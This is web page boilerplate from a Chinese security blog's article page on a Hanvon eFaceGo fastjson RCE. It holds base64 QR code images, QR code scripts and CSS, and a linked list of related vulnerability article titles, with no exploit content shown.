eegYH5B0/XkI3PAmjGQ+GVWe2qzjBV+n1mBu9sw6PeHBfeErxhOMBu4B49TlA2vKdwHWwRjP9YbkJH4Irr8YZsPgbaUO5l5nHV4YLQieJU0BruEeZw/Yoz5FdOU1djz03vih89BrzYo3CPaAMfxEuNc1TwHWwJheaTXCX29ITuKH4PoZknvJxqBvMzp0Xn4wBx3TE5RXMevKRfssakbiWe/0zVr94T6LgNpXAOvn6So+vmXWR9q+wL7o1xvSjuf9xVoIeEtgzLZye6mDYB8c//w6vamD4J45I3rFMw/0GekB83Dcz6sz4OjNvIlgT3g4r3PdiekND56ROvpaSIoL338C61NWbiPbAm8P9hif+sCecNBreXZR/TtdXPXA8fRLU0C/lvxgDozidgFdr/PAGhjTD71WjyK68rMA94LxrOd6Q85O8E18+5QFfXvZ4sTdvULvBdfTC+bBqNnPPNHBPamDQNLbPwNorgJon3bAtTTFrXGbdFJ+BXgGdJSWDrCWeiLs9esNmSf15notRJutAfvtgXkwPrr3zItn1uGF4HnxPEOwX70JMAfG8JkF5lNHrzi11ODe6lUeXbkC7ANUrgDaG7rIB9/WQqY+LxQ9fDC8cMeJfxZw/sMa/B8DHTMz16wY7QyhzwLX1Z95lVMO3Quuqz/5RPUrwitXgGeAcbsQGa94zwmsj73g7cBrWG91brxqr+Tqjw98fXGK8M8QOLUA2z8yNF+RRuWw98YTlFeReoewnwV7XvMU1xuyO803cmsh2swrMe9TPZNLDX4S5FGA6+jiFKqha9Br+RTy7mKnQZ+RPnkVswZCnaL6FDEoVwB3b6F4RbxBcbsAz1gLifnC959AWwh4S9DxO7cJnpWnIrPAPBDqhmfeMx5YTyhwOmP23oybBFjzIp31gn1VB3PQMbOCsNfbQmK+8P89gUfTv7UQ4DYb2D5V9emReVeLV0SD/Sx5FPEpV6SuKL4GeCYYqzbzzAF7wfjMJz29QXE14PGsby2kXujK/8wJ/PGFQH8CwDUYc9v1Cap59B3CfgaYh3s8mw3dG58QrO3uoXLQfY96pSnSr1yRGjzrjy8kF7jwayfQFqKN7eJstLxnGnjj0eVVQOeBWNbPILj/3dbN8DsBbl44/Jo/A+z93XqDMx/cz0sTeBYYw1fM3HCp4bxH3vjaQiRc8d4TWAsBbw8e46NbzYbjSR2cPPha4sH5K175Z4D74R7PZs4ZquOFPkeaIrpyReogIHoFsN7iVXx8iycIXf+wrK+1kJVd337ECfwHAAD//8IapBAAAAAGSURBVAMAAilFyDNGL0gAAAAASUVORK5CYII=)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-addVisitDeviceAppointmentInfoTest-fastjson-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAANlElEQVR4Aeyc4XbbyA6D++37v/NuMCgskh7ZTtKt80P3hAEJgJR2KDVues7959evX/9+Nv594X+ZOa2TVz09s5ZHEV65YtbiEtGCZ3zVay5/6onSakxdddU/k2shvz4GvBQfg0+/gF9wRGbOhvBgb9XBHHSMB8xnRvjUwnBnCJ4Bxvhqr3JFtInSFOGhzwovlO+VkFexFqLkip9xAm0h4E1Dx0e3CvbOpwDMpxd6HX6HmbXTxEGfBYh+GJkZjBm4vdk7Du71+Oas8DuEYw4c+fS2hUzxqv/+CXx7IWdPyRk//xPlmxz4CQovjyL1KwieAR3Tq3kzwN4zT3iwD4yZA8TyZfz2Qr585atxewLfWgjw8p+/eYrmXcAxI56J6QmfGtyrGo5cdSI9wfBBOPqmB6xBx+nLLPHJv4rfWshXL3r1nZ9AW4g2vIuzdnmjgZ8icbuIL7jzgGeAMd4z3M2INxr0WeAajPFXTG/lvptn5sQ5ty1kil+ur8Yvn8BaCPhpgcc4rwLc/oa/04AbDayfNyHgqMF5np54gmA99URgUk/r3bWAdo8ZsvNGqwjUcuXAmgmPcZk/vq2FfOD19UNO4J9s/zP46N7BT0I84Drzw9c6OdgbDzyu41N/8onSFOBZyhXxKVekriheUbldDsfs6Or7SlxvSE7wh2BbCHjTYJz3CObBWPU8DZVTPnm47wVz8QbVr0gdFKcA98GB4l8JOHrA+ZyfOWB91vEHwT44cPakPsO1EPCAmHKB1GA9fFA6WANjtKA8Cug6uJY2A/Ya7PlcS5hZsPeCeXlngDUwZlZ8qYOw98UvjFe5AtwDe1wLSdOF7z+Bf+D8o2tuT5tVQN+qdPE1xNUA98QD93X1P8ozI57UQKg7BNbHznhjAPO1Tv7MG18QjlngHPaYnnmN1NcbkhP6IdgWki3l3sBbTj111WAP7FEeBVhXrgDXmV1Reg1Y3vWkA9W6cnlX8vFN+S6A1T+1j5b1JX4lH9/A3o/04Zd6FDuT+Bo7T+XA12wLqYYrf88JrL8Ygrfz7Bbg3penYPZOPjV4RmphesEaGMPLo5g12AdEukOgvRngGoxpAJLeEFi9IXQPNSafWgjuBaM4Rfphz19viE7pB8X6lJX7gb618MFsNzWQ9PZLxniA9nSB6+hphONT3k4DYr1dA1iz4xeCuZjBtTQF9Hr6Un8FwbN3vbp2DejeaGD+ekN2p/hGbv0MyZbmfYQHbw+M4eUHc8o/E3D0gXMwZn4QzIPx0XXAnvQ+8k4tPcHoqcGzw8N9HW88Qeje8BOvN2SeyJvrlxaSrQfh2Ha4/HfAoYV7hmczwLOiTwTrmj81cbuAo0d67VNdIxr0nuo5y9Mb/ayGPvulhWTohf//CaxPWeAtZYvgGoy5Dei1eDAHRnGKzFJeA+yLLqy6cnEK5QpwDxjFzQBrYIwOvQ6v+YpfIQrC4x6wrv4ZZcw2jX8rfpDXG/JxCD/pay0kWwNvft4gmI+v6uGCVat59CB45s5TOeXpUa6A3gvH32Wk15i90cAz4MBos2fW8e0Qjnlwn6cHrGV2cH3shS6maSI892Uw2PuZGbDvmTN2Nbh3Xh86Hz0zZh1eCO4Fo7hdgHW4fzAezd/NWm/ITri495zA+qH+7NLZchD8RKgPjnxXi1PAuQ+s7earNxF9h/GAZ6UOgnkwZga4jk8I5uIRp4DOg2tpCvnBnHIFuJaugF6Lq3G9IfU0fkDeFgLenjZbI/cJ93q0YPpSg3tSB6cvvHBq0GdAr9WTSO/EqaeuCH0u9DpeOOfPPGf3E3+wLSTkhe87gbWQbC+3AfsnID6416Fz8WbmKwj7GXPWrOts8AwwRps9YD18xfQEq6Y8/ERpM+IBXy91fGAejGshMV34x07gy4O2CznbHniLu6vNnnjCn9Xi4wmCrwNGeXYB1oE7ObMiAOsftVJPXTzYMzUwL48i+kRpYC8YxSnihc5LU0TfLkSGK95zAtuFQN9itjcRuLvreO6EQQDriQVuCrC4EJkFnQfX0eMXhgN7xCnOeOg+eWekNzy4B4zhK6YnCPamjjc1WN8uJOYL//4JrN9l5bLZVuogeHvQUXp6oGvQa3kVYD59QjAn/VFA90Gv1QvmNFcBrsEoTgGu1aMABCuA9abKp1hk+SauBtgP3FzAmgHGCOAajOEz73pDciI/BNtCoG8t95jtTZQO7tlp0s94cJ88iXhTw70nmjD+iuIV0HvjAfOpg+qZAfbCHqdfdeZNlFYjOvTZbSG14crfcwJrIeAtZWtntwL2VX32wL2n+mcOx78hgHvnzNTB3YzJndWZAb4WGKs/nsopDx8E96aWJwHWUgd33mjC9ut38JCzph0P7tEwxfSAdTDK8yzA3swC12d98j3SpINngHH65UlMLTXse6NXPJsFfUZ8wfWG1EE1v/K/fwJtIdkS9C2Ca+i4u12wJ7OC0xteGE25IjV4VuqJYB0OjEdzFGBt8tIU4XcoXRFNuWLWcFwDnEPH2ZN6YlvIFK/675/AWoi2rnh2eXkU1adaUbmag58UeWrEA9bhwPjiOavDC+MNguellkcBnY8OJL39he5GvJhofqzKFbMGbvOByDdcC7lVV/L2E1gLAdbWnt0NdJ+eALjnxGeWckVquPdHk08B9ihXRJ8I9sHx0Xl61K8Ae6NDr8ML5VfA3gPmwSivAu7vQ7xCcxXKa4irsRZSiSt/7wm0hUDfeG6tbrTmQCx3CLS3DnqdBjieKjj3gDU4MDMq5v4qpzx8UNwM8OzJpwf2evzyJYe9F8xDx/S1hYS88H0n0H79fnYbsN9m9YM9lVMOnddTpADzM1etPgUcHvEJaTXEpwb3nNXhg+pVqBYqlNeAPlMeRTxw6HDk0YVgXn0KcTXA+hvekHobVz5PYC1EG6sRU+VqDt5m5dITjDZrcG94IOkpAu3n0TSCdeAmzesDawYYb8bfifxgDYziFL8tpyCPArh5VCuAdd0I0Gt5FNHXQlJc+P4TWL/thb412NfQ+d3tgz1gjAdc62lQhH+E8tU48+484OvNnupVXnXVNaqmPBrsZ8vzLDIjCJ6V+npDnp3gX9bbQqBvC1znnrLFIBDp9v+ycCNGUnvg6JPtTAPWn7/QUT2K9Ck/i3iC0GeBa/XDkas+i8yaenjh1J7V4GuvhWiAYjaJqwFuAqM0cA7GzJCmSA3WxSnCC8Ga8hry1aiactj3SUsf7D3Rg4DathHPFM/46VM9vcB62MIH10LUcMXPOIG2kGwJvL15i9GD0pNPlFYjOnh2amH1KRenAHvBKK6GvGcB7vmMntngXtjjnAn2iYcjV52ZyhVg/YxvC1HDFe89gfWrE/DW5q2AeegYH5B0/XkI3PAmjGQ+GVWe2qzjBV+n1mBu9sw6PeHBfeErxhOMBu4B49TlA2vKdwHWwRjP9YbkJH4Irr8YZsPgbaUO5l5nHV4YLQieJU0BruEeZw/Yoz5FdOU1djz03vih89BrzYo3CPaAMfxEuNc1TwHWwJheaTXCX29ITuKH4PoZknvJxqBvMzp0Xn4wBx3TE5RXMevKRfssakbiWe/0zVr94T6LgNpXAOvn6So+vmXWR9q+wL7o1xvSjuf9xVoIeEtgzLZye6mDYB8c//w6vamD4J45I3rFMw/0GekB83Dcz6sz4OjNvIlgT3g4r3PdiekND56ROvpaSIoL338C61NWbiPbAm8P9hif+sCecNBreXZR/TtdXPXA8fRLU0C/lvxgDozidgFdr/PAGhjTD71WjyK68rMA94LxrOd6Q85O8E18+5QFfXvZ4sTdvULvBdfTC+bBqNnPPNHBPamDQNLbPwNorgJon3bAtTTFrXGbdFJ+BXgGdJSWDrCWeiLs9esNmSf15notRJutAfvtgXkwPrr3zItn1uGF4HnxPEOwX70JMAfG8JkF5lNHrzi11ODe6lUeXbkC7ANUrgDaG7rIB9/WQqY+LxQ9fDC8cMeJfxZw/sMa/B8DHTMz16wY7QyhzwLX1Z95lVMO3Quuqz/5RPUrwitXgGeAcbsQGa94zwmsj73g7cBrWG91brxqr+Tqjw98fXGK8M8QOLUA2z8yNF+RRuWw98YTlFeReoewnwV7XvMU1xuyO803cmsh2swrMe9TPZNLDX4S5FGA6+jiFKqha9Br+RTy7mKnQZ+RPnkVswZCnaL6FDEoVwB3b6F4RbxBcbsAz1gLifnC959AWwh4S9DxO7cJnpWnIrPAPBDqhmfeMx5YTyhwOmP23oybBFjzIp31gn1VB3PQMbOCsNfbQmK+8P89gUfTv7UQ4DYb2D5V9emReVeLV0SD/Sx5FPEpV6SuKL4GeCYYqzbzzAF7wfjMJz29QXE14PGsby2kXujK/8wJ/PGFQH8CwDUYc9v1Cap59B3CfgaYh3s8mw3dG58QrO3uoXLQfY96pSnSr1yRGjzrjy8kF7jwayfQFqKN7eJstLxnGnjj0eVVQOeBWNbPILj/3dbN8DsBbl44/Jo/A+z93XqDMx/cz0sTeBYYw1fM3HCp4bxH3vjaQiRc8d4TWAsBbw8e46NbzYbjSR2cPPha4sH5K175Z4D74R7PZs4ZquOFPkeaIrpyReogIHoFsN7iVXx8iycIXf+wrK+1kJVd337ECfwHAAD//8IapBAAAAAGSURBVAMAAilFyDNGL0gAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-addVisitDeviceAppointmentInfoTest-fastjson-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 